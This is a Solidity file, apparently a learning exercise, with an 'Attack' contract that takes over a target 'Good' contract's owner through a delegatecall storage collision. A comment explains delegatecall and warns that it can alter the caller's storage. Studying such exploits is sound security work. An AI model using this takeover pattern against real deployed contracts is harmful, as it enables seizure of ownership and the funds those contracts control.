// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import "./Good.sol";

contract Attack {
 address public helper;
 address public owner;
 uint256 public num;

 Good public good;
 constructor(Good _good){
    good = Good(_good);
 }
 function setNum(uint256 _num) public {
    owner = msg.sender;
 }
 function attack() public {
    good.setNum(uint256(uint160(address(this))));
    good.setNum(1);
 }
} 

// contract ContractA { address public contractB; uint public result; constructor(address _contractB) { contractB = _contractB; } function callFoo(uint num) public { bytes memory payload = abi.encodeWithSignature("foo(uint256)", num); (bool success, bytes memory returnData) = contractB.delegatecall(payload); require(success, "delegatecall failed"); result = abi.decode(returnData, (uint)); } } contract ContractB { uint public value; function foo(uint num) public returns (uint) { value = num * 2; return value; } } In this example, we have two contracts: ContractA and ContractB. ContractA has a state variable result, which will be set to the return value of ContractB's foo() function when callFoo() is called. The callFoo() function uses delegatecall() to call ContractB's foo() function, passing in a single argument num. The return value of foo() is stored in result and can be read by anyone. ContractB's foo() function takes a single argument num, multiplies it by 2 and stores the result in its own state variable value. The function then returns the value. When callFoo() is called, it constructs a payload using abi.encodeWithSignature() to call ContractB's foo() function with the argument num. It then calls delegatecall() on the contractB address, passing in the payload and enough gas to execute the function. The result of the delegatecall() is checked using the require() statement, and if it was successful, the return value is decoded and stored in result. Note that in this example, ContractA trusts ContractB to execute foo() correctly and to not modify its state. This is important, since delegatecall() can be used to modify the storage of the calling contract.
